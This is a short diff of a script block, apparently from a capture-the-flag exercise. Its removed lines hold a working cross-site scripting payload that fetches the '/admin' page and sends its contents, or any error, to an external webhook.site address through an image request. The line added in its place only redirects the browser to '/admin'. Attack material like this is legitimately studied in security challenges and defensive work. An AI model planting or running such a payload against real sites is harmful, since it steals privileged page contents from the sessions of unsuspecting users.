@@ -1,14 +1,3 @@
 <script>
-fetch('/admin')
-  .then(r => r.text())
-  .then(d => {
-    new Image().src =
-      'https://webhook.site/0c2a0964-b6a5-49fd-989f-0c6e3593cd7b?flag='
-      + encodeURIComponent(d);
-  })
-  .catch(e => {
-    new Image().src =
-      'https://webhook.site/0c2a0964-b6a5-49fd-989f-0c6e3593cd7b?err='
-      + encodeURIComponent(e);
-  });
+location = '/admin';
 </script>
